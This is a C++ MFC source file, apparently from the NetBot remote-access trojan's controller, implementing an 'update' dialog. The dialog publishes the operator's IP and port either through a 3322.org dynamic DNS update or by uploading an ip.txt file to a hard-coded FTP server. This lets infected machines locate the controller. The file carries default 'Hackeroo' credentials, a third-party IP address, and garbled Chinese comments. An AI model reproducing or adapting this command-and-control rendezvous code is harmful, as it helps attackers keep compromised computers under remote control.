// UpdateDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "UpdateDlg.h"

#include "winsock.h"//---
#include "afxinet.h" //WinInet����Ҫ��ͷ�ļ�

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CUpdateDlg dialog


CUpdateDlg::CUpdateDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CUpdateDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CUpdateDlg)
	m_DnsUser = _T("Hackeroo");
	m_DnsPass = _T("Hackeroo");
	m_DnsDomain = _T("hackeroo.3322.org");
	m_FtpIP = _T("202.119.25.123");
	m_FtpPort = 21;
	m_FtpPass = _T("Hackeroo");
	m_FtpUser = _T("Hackeroo");
	m_FtpUrl = _T("\\wwwroot\\ip.txt");
	//}}AFX_DATA_INIT
}


void CUpdateDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CUpdateDlg)
	DDX_Control(pDX, IDC_STATIC_3322, m_3322);
	DDX_Control(pDX, IDC_COMBO_DNSIP, m_Combo_DnsIP);
	DDX_Control(pDX, IDC_COMBO_FTPIP, m_Combo_FtpIP);
	DDX_Text(pDX, IDC_EDIT_DNSUSER, m_DnsUser);
	DDV_MaxChars(pDX, m_DnsUser, 100);
	DDX_Text(pDX, IDC_EDIT_DNSPASS, m_DnsPass);
	DDV_MaxChars(pDX, m_DnsPass, 100);
	DDX_Text(pDX, IDC_EDIT_DNSDOMAIN, m_DnsDomain);
	DDV_MaxChars(pDX, m_DnsDomain, 100);
	DDX_Text(pDX, IDC_EDIT_FTPIP, m_FtpIP);
	DDV_MaxChars(pDX, m_FtpIP, 100);
	DDX_Text(pDX, IDC_EDIT_FTPPORT, m_FtpPort);
	DDV_MinMaxUInt(pDX, m_FtpPort, 0, 65500);
	DDX_Text(pDX, IDC_EDIT_FTPPASS, m_FtpPass);
	DDV_MaxChars(pDX, m_FtpPass, 100);
	DDX_Text(pDX, IDC_EDIT_FTPUSER, m_FtpUser);
	DDV_MaxChars(pDX, m_FtpUser, 100);
	DDX_Text(pDX, IDC_FTPURL, m_FtpUrl);
	DDV_MaxChars(pDX, m_FtpUrl, 200);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CUpdateDlg, CDialog)
	//{{AFX_MSG_MAP(CUpdateDlg)
	ON_BN_CLICKED(IDC_BTN_DNSUPDATE, OnBtnDnsupdate)
	ON_BN_CLICKED(IDC_BTN_FTPUPDATE, OnBtnFtpupdate)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CUpdateDlg message handlers
BOOL CUpdateDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the small icon for this dialog
	SetIcon(AfxGetApp()->LoadIcon(IDI_OL_UPDATE), FALSE);
	CenterWindow();
	// TODO: Add extra initialization here
	//---------------
	ReadIniFile();

	m_3322.m_link = _T("http://www.3322.org/dyndns/register");

	//���IP--------------------------------
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1, 1), &wsaData);
	char szhostname[128];

	if (gethostname(szhostname, 128) == 0)
	{

		struct hostent * phost;
		int i, j, h_length = 4;
		phost = gethostbyname(szhostname);
		for (i = 0; phost != NULL && phost->h_addr_list[i] != NULL; i++)
		{
			CString str;
			for (j = 0; j < h_length; j++)
			{
				CString addr;
				if (j > 0)
					str += ".";
				addr.Format("%u", (unsigned int)((unsigned char*)phost->h_addr_list[i])[j]);
				str += addr;
			}
			m_Combo_DnsIP.AddString(str);
			m_Combo_FtpIP.AddString(str);
		}
		m_Combo_DnsIP.SetCurSel(0);
		m_Combo_FtpIP.SetCurSel(0);
	}

	//   WSACleanup();
		//---------------------------
	GetDlgItem(IDC_COMBO_FTPPORT)->SetWindowText("1986");
	UpdateData(FALSE);
	return TRUE;
}

void CUpdateDlg::OnBtnFtpupdate()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	//�������IP���˿���ϢΪ�ļ�------------------
	CString ip, str;
	GetDlgItem(IDC_COMBO_FTPIP)->GetWindowText(ip);
	GetDlgItem(IDC_COMBO_FTPPORT)->GetWindowText(str);
	ip = "[" + ip + ":" + str + "]";
	HANDLE hFile;
	hFile = CreateFile("ip.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD numWrite;
	WriteFile(hFile, ip, ip.GetLength(), &numWrite, NULL);
	CloseHandle(hFile);

	//����������Ϣ
	str.Format("%d", m_FtpPort);
	m_Ini.SetKeyValue("FTP Setting", "FtpAddress", m_FtpIP);
	m_Ini.SetKeyValue("FTP Setting", "FtpPort", str);
	m_Ini.SetKeyValue("FTP Setting", "FtpUsername", m_FtpUser);
	m_Ini.SetKeyValue("FTP Setting", "FtpPassword", m_FtpPass);
	m_Ini.SetKeyValue("FTP Setting", "FilePath", m_FtpUrl);


	CreateThread(NULL,
		0,
		(LPTHREAD_START_ROUTINE)FtpUpdateThread,
		this,
		0,
		NULL);
}

void CUpdateDlg::OnBtnDnsupdate()
{
	// TODO: Add your control notification handler code here
	UpdateData();

	CString strUrl, strTemp;
	GetDlgItem(IDC_COMBO_DNSIP)->GetWindowText(strTemp);
	strUrl = "http://";
	strUrl += m_DnsUser;
	strUrl += ":";
	strUrl += m_DnsPass;
	strUrl += "@members.3322.org/dyndns/update?system=dyndns&hostname=";
	strUrl += m_DnsDomain;
	strUrl += "&myip=";
	strUrl += strTemp;
	strUrl += "&wildcard=OFF";

	CInternetSession m_Session(NULL, 0);
	CHttpFile* pHttpFile = NULL;
	pHttpFile = (CHttpFile*)m_Session.OpenURL(strUrl);
	if (pHttpFile == NULL)
	{
		MessageBox("Update Error!", "3322 Domain");
		pHttpFile->Close();
		m_Session.Close();
		return;
	}
	pHttpFile->ReadString(strTemp);

	pHttpFile->Close();
	m_Session.Close();

	MessageBox(strTemp, "3322����");

	//����������Ϣ
	m_Ini.SetKeyValue("DNS Setting", "DnsUser", m_DnsUser);
	m_Ini.SetKeyValue("DNS Setting", "DnsPass", m_DnsPass);
	m_Ini.SetKeyValue("DNS Setting", "DnsDomain", m_DnsDomain);
}

void CUpdateDlg::ReadIniFile()
{
	char Path[255];
	GetCurrentDirectory(255, Path);
	CString path;
	path.Format("%s\\NetBot.ini", Path);
	if (m_Ini.SetPath(path))
	{
		CString temp;
		m_FtpIP = m_Ini.GetKeyValue("FTP Setting", "FtpAddress");
		temp = m_Ini.GetKeyValue("FTP Setting", "FtpPort");
		m_FtpPort = atoi(temp);
		m_FtpUser = m_Ini.GetKeyValue("FTP Setting", "FtpUsername");
		m_FtpPass = m_Ini.GetKeyValue("FTP Setting", "FtpPassword");
		m_FtpUrl = m_Ini.GetKeyValue("FTP Setting", "FilePath");

		m_DnsUser = m_Ini.GetKeyValue("DNS Setting", "DnsUser");
		m_DnsPass = m_Ini.GetKeyValue("DNS Setting", "DnsPass");
		m_DnsDomain = m_Ini.GetKeyValue("DNS Setting", "DnsDomain");
	}
}

DWORD CUpdateDlg::FtpUpdate()
{
	//FTP�ϴ��ļ�---------------------------------
	CInternetSession *seu;
	CFtpConnection *pFTP;
	//�½��Ի�
	seu = new CInternetSession(AfxGetAppName(), 1, PRE_CONFIG_INTERNET_ACCESS);
	try
	{
		//�½����Ӷ���
		pFTP = seu->GetFtpConnection(m_FtpIP, m_FtpUser, m_FtpPass, m_FtpPort, FALSE);
	}
	catch (CInternetException *pEx)
	{
		//��ȡ����
		TCHAR szError[1024];
		if (pEx->GetErrorMessage(szError, 1024))
			MessageBox(szError, "FTP����");
		else
			MessageBox("There was an exception", "FTP����");
		pEx->Delete();

		return 0;
	}
	//�ϴ�
	if (pFTP->PutFile("ip.txt", m_FtpUrl))
		MessageBox("����IP�ɹ�!", "FTP����");
	else
		MessageBox("����IPʧ��", "FTP����");

	pFTP->Close();

	return 0;
}

DWORD CUpdateDlg::FtpUpdateThread(void* pThis)
{
	return ((CUpdateDlg*)pThis)->FtpUpdate();
}
